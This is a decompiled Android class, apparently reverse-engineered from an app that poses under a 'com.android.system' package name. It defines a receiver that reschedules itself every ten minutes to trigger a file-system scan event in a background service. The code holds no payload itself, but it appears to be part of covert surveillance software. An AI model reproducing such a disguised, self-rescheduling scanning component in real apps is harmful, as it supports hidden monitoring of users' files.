package com.android.system;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;
import com.app.system.common.service.EventsAndReceiveService;

public class FileSystemScanReceiver
  extends BroadcastReceiver
{
  public static void a(Context paramContext)
  {
    com.security.d.a.d("FSScanReceiver", "scheduleAlarms", new Object[0]);
    b(paramContext);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + 600000L, PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, FileSystemScanReceiver.class), 0));
  }
  
  private static void b(Context paramContext)
  {
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, FileSystemScanReceiver.class), 134217728);
    localPendingIntent.cancel();
    ((AlarmManager)paramContext.getSystemService("alarm")).cancel(localPendingIntent);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    com.security.d.a.d("FSScanReceiver", "onReceive", new Object[0]);
    paramIntent = new Intent(paramContext, EventsAndReceiveService.class);
    paramIntent.putExtra("event_core_app", "event_fs_scan");
    com.b.a.a.a.a(paramContext, paramIntent);
    a(paramContext);
  }
}


/* Location:              ~/com/android/system/FileSystemScanReceiver.class
 *
 * Reversed by:           J
 */